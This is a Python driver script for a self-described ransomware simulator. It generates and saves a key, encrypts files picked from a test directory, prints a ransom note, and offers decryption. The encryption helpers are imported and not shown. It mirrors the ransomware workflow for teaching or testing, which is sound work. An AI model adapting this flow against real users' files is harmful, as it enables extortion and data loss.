import sys
import os

# Add the root directory to the Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from src.file_manager import select_files, encrypt_files, decrypt_files
from encryption.key_management import generate_key, save_key, load_key
from config.settings import LOGS_DIR, TEST_FILES_DIR
from colorama import init, Fore, Back, Style

# Initialize colorama
init(autoreset=True)

def display_ransom_note():
    print(Fore.RED + Style.BRIGHT + "\n[WARNING] Your files have been encrypted!")
    print(Fore.YELLOW + "To recover your files, contact the attacker with the decryption key.")
    print(Fore.YELLOW + "All your important files are locked with encryption.\n")

def run_simulation():
    print(Fore.GREEN + "Welcome to the Ransomware Simulator!")

    # Step 1: Generate a new encryption key
    key = generate_key()
    key_file_path = os.path.join(LOGS_DIR, 'encryption_key.key')

    # Save the key for later use (for decryption)
    save_key(key, key_file_path)

    # Step 2: Select the files to encrypt
    print(Fore.CYAN + "\nSelecting files from the test directory...")
    files_to_encrypt = select_files()

    if not files_to_encrypt:
        print(Fore.RED + "No files found in the directory to encrypt!")
        return

    # Step 3: Display the ransom note
    display_ransom_note()

    # Step 4: Encrypt the files
    print(Fore.BLUE + "\nEncrypting files...")
    encrypted_files = encrypt_files(files_to_encrypt, key)
    print(Fore.GREEN + f"Encrypted files: {encrypted_files}")

    # Step 5: Ask the user if they want to decrypt the files
    decrypt_choice = input(Fore.YELLOW + "\nWould you like to decrypt the files now? (yes/no): ").strip().lower()
    if decrypt_choice == 'yes':
        # Step 6: Decrypt the files
        print(Fore.BLUE + "\nDecrypting files...")
        decrypted_files = decrypt_files(encrypted_files, key)
        print(Fore.GREEN + f"Decrypted files: {decrypted_files}")
        print(Fore.GREEN + "\nDecryption successful! Your files are now restored.")
    else:
        print(Fore.RED + "\nDecryption skipped. Files remain encrypted.")

    # Step 7: End of simulation
    print(Fore.MAGENTA + "\nRansomware simulation completed.")

if __name__ == "__main__":
    run_simulation()
